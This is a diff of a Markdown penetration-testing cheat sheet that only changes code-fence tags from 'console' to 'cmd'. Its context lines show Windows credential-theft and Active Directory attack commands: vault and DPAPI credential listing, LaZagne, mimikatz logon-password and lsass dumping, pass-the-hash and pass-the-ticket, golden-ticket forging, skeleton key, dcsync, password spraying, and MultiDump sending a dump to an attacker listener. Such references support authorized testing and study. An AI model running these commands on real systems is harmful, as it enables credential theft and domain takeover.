@@ -117,7 +117,7 @@ $ ./bkcrack -c tmp/fd734d942c6f729a36606b16a3ef17f8/<FILE>.txt -C <FILE>.zip -p 
 
 ### List Vault
 
-```console
+```cmd
 C:\> vaultcmd /listcreds:"Windows Credentials" /all
 ```
 
@@ -127,14 +127,14 @@ mimikatz vault::list
 
 ### Credential Files
 
-```console
+```cmd
 C:\> dir /a:h C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\
 C:\> dir /a:h C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\
 PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\
 PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\
 ```
 
-```console
+```cmd
 PS C:\> Get-ChildItem C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\
 PS C:\> Get-ChildItem C:\Users\<USERNAME>\AppData\Local\Microsoft\Protect
 PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\
@@ -520,7 +520,7 @@ $ ./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <
 
 > https://github.com/AlessandroZ/LaZagne
 
-```console
+```cmd
 C:\> laZagne.exe all
 ```
 
@@ -559,13 +559,13 @@ mimikatz # lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
 
 This is helpful when executing within a `Evil-WinRM` session.
 
-```console
+```cmd
 C:\> mimikatz.exe "sekurlsa::logonpasswords" "exit"
 ```
 
 ### Dump Hashes
 
-```console
+```cmd
 C:\> .\mimikatz.exe
 mimikatz # sekurlsa::minidump /users/admin/Desktop/lsass.DMP
 mimikatz # sekurlsa::LogonPasswords
@@ -601,7 +601,7 @@ mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /aes256:b54259bbff
 
 ### Pass the Ticket
 
-```console
+```cmd
 C:\> .\mimikatz.exe
 mimikatz # sekurlsa::tickets /export
 mimikatz # kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
@@ -611,7 +611,7 @@ C:\> dir \\<RHOST>\admin$
 
 ### Forging Golden Ticket
 
-```console
+```cmd
 C:\> .\mimikatz.exe
 mimikatz # privilege::debug
 mimikatz # lsadump::lsa /inject /name:krbtgt
@@ -623,7 +623,7 @@ C:\> dir \\<RHOST>\admin$
 
 ### Skeleton Key
 
-```console
+```cmd
 C:\> .\mimikatz.exe
 mimikatz # privilege::debug
 mimikatz # misc::skeleton
@@ -657,7 +657,7 @@ mimikatz # dpapi::cred /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Creden
 $ python3 MultiDumpHandler.py -r <LPORT>
 ```
 
-```console
+```cmd
 PS C:\> .\MultiDump.exe --procdump -r <LHOST>:<LPORT>
 ```
 
@@ -1222,7 +1222,7 @@ BruteForce $duration $threshold $passwords
 
 ### Usage
 
-```console
+```cmd
 PS C:\> .\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin
 ```
 
